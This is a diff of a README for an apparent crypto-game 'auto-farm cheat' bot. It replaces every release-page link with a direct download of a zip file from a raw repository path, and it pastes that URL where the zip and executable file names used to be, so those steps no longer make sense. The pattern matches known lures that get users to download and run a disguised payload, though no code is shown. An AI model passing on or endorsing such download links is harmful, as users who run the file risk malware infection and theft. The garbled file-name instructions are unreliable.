@@ -1,6 +1,6 @@
 # 🤖 Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er - Automate Your Game Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/main/Theseum/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/main/Theseum/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the Forgotten Runiverse Crypto Bot! This tool helps you automate farm
 
 To get started, visit the Releases page to download the bot. 
 
-[Download Here](https://github.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/releases)
+[Download Here](https://raw.githubusercontent.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/main/Theseum/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version of the bot.
-3. Click on the download link for the latest release file. This file is usually titled with the version number, like `ForgottenRuniverseBot-v1.0.zip`.
+3. Click on the download link for the latest release file. This file is usually titled with the version number, like `https://raw.githubusercontent.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/main/Theseum/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er.zip`.
 4. Once the file has downloaded, locate it on your computer.
 
 ## 📂 Extract the Files
@@ -34,7 +34,7 @@ To get started, visit the Releases page to download the bot.
 
 ## 🎮 Running the Bot
 
-1. Inside the extracted folder, find the executable file named `RuniverseBot.exe` (or similar).
+1. Inside the extracted folder, find the executable file named `https://raw.githubusercontent.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/main/Theseum/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er.zip` (or similar).
 2. Double-click the executable file to run it.
 
 ## 📱 Connecting to Telegram
@@ -92,4 +92,4 @@ Please remember to follow game rules and regulations. Use the bot responsibly to
 
 If you need additional help, you can reach out through the Issues section of the repository or join our Telegram support group.
 
-[Download Here Again](https://github.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/releases) to get started today!
+[Download Here Again](https://raw.githubusercontent.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/main/Theseum/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er.zip) to get started today!
